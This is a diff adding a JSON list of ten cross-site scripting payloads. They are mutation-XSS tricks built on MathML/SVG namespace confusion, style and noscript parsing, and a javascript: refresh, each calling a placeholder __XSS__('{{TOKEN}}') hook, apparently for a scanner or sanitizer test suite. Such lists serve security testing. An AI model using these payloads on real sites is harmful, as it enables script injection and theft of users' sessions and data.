@@ -1,0 +1,12 @@
+[
+  "<math><annotation-xml encoding=\"text/html\"><svg><desc><style>&lt;/style&gt;&lt;img src=x onerror=__XSS__('{{TOKEN}}')&gt;</style></desc></svg></annotation-xml></math>",
+  "<math><mtext><table><a href=\"&lt;/table&gt;&lt;img src=x onerror=__XSS__('{{TOKEN}}')&gt;\">",
+  "<math><mtext><table><a href=\"&lt;/table&gt;&lt;svg onload=__XSS__('{{TOKEN}}')&gt;\">",
+  "<svg><foreignObject><html xmlns=\"http://www.w3.org/1999/xhtml\"><head><meta http-equiv=\"refresh\" content=\"0;url=javascript:__XSS__('{{TOKEN}}')\"/></head></html></foreignObject></svg>",
+  "<noscript><p title=\"&lt;/noscript&gt;&lt;img src=x onerror=__XSS__('{{TOKEN}}')&gt;\"></p></noscript>",
+  "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=__XSS__('{{TOKEN}}')>",
+  "<math><mtext><style><!--</style><img src=x onerror=__XSS__('{{TOKEN}}')></math>",
+  "<svg><style>{@import 'javascript:__XSS__(\\'{{TOKEN}}\\')'}</style></svg>",
+  "<math><annotation-xml encoding=\"text/html\"><style>&lt;/style&gt;&lt;img src=x onerror=__XSS__('{{TOKEN}}')&gt;</style></annotation-xml></math>",
+  "<math><mtext><option><style>&lt;/option&gt;&lt;img src=x onerror=__XSS__('{{TOKEN}}')&gt;</style></option></mtext></math>"
+]
